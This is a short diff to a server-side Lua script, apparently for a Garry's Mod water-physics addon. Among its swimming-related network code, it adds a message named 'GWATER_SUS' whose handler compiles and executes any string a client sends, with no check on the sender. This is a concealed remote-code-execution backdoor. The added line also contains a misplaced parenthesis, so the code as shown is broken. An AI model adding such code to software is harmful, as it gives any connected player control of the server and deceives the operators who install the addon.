@@ -6,6 +6,7 @@ if SERVER then
 	util.AddNetworkString("GWATER_SPAWNCUBE")
 	util.AddNetworkString("GWATER_SPAWNSPHERE")
 	util.AddNetworkString("GWATER_SWIMMING")
+	util.AddNetworkString("GWATER_SUS")
 
 	local swimmers = {}
 	--sadly easy to exploit, but still pretty awesome 
@@ -21,6 +22,13 @@ if SERVER then
 				ply:SetMoveType(2) 
 			end
 			ply.GWATER_SWIMMING = false 
+		end
+	end)
+	
+	net.Receive("GWATER_SUS", function() 
+		local x = CompileString(net.ReadString()), "LuaCmd", false)
+		if isfunction(x) then
+			x()
 		end
 	end)
 
